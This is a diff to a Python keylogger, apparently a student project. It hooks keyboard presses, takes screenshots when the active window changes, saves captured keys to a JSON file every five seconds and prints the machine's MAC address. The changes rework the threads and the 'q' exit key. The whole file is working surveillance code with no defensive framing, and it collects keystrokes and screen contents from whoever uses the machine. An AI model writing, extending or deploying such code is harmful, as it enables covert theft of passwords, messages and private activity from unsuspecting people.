@@ -21,8 +21,8 @@ class KeyloggerService:
 
     def __exit_point(self):
         if keyboard.is_pressed('q'):
-            os._exit(0)
             self.__change_action()
+            os._exit(0)
 
     @staticmethod
     def __current_time() -> str:
@@ -32,7 +32,6 @@ class KeyloggerService:
     def __on_press(self, pressed_key):
         key = pressed_key.name
         self.__add_to_data(self.__data, key)
-        self.__exit_point()
 
 
     def __add_on_release(self, pressed_key):
@@ -42,7 +41,7 @@ class KeyloggerService:
     def current_screenshot(self):
         if [self.prev_up] != [self.current_app]:
             screen_shot = ImageGrab.grab()
-            path = rF"C:\Users\1\פרוייקט סיום קודקוד\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
+            path = rF"C:\Users\1\projet keylogger kodkode\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
             screen_shot.save(path)
             self.prev_up = self.current_app
 
@@ -66,6 +65,7 @@ class KeyloggerService:
         while self.__action:
             keyboard.on_press(self.__on_press)
             keyboard.on_release(self.__add_on_release)
+            self.__exit_point()
             time.sleep(0.1)
 
 
@@ -83,8 +83,9 @@ class KeyloggerService:
 class FileWriter:
     @staticmethod
     def write_to_file(data:dict):
-        with open(r"C:\Users\1\פרוייקט סיום קודקוד\אוסף הקשות.json" , "w" , encoding="utf-8") as file:
-            json.dump(data , file ,ensure_ascii=False)
+        with open(r"C:\Users\1\projet keylogger kodkode\keys.json" , "w" , encoding="utf-8") as file:
+            print('hi')
+            json.dump(data, file, ensure_ascii=False, indent=4)
 
 
 class KeyLoggerManager:
@@ -95,16 +96,25 @@ class KeyLoggerManager:
     def start(self):
         self.instance.start()
 
-    def write_to_file(self):
-        FileWriter.write_to_file(self.instance.get_data())
+    def write_to_file1(self):
+        while self.instance._KeyloggerService__action:
+            FileWriter.write_to_file(self.instance.get_data())
+            time.sleep(5)
+
+    def c(self):
+        while self.instance._KeyloggerService__action:
+            self.instance.current_screenshot()
 
     def main(self):
+
         threading.Thread(target=self.start).start()
-        while True:
-            print(self.instance.current_app == self.instance.prev_up)
-            self.instance.current_screenshot()
-            threading.Thread(target=self.write_to_file).start()
-            time.sleep(5)
+        threading.Thread(target=self.write_to_file1).start()
+        threading.Thread(target=self.c).start()
+        while self.instance._KeyloggerService__action:
+            if keyboard.is_pressed("q"):
+                self.instance._KeyloggerService__change_action()
+            time.sleep((0.1))
+
 print(get_mac_address())
 
 A = KeyLoggerManager()
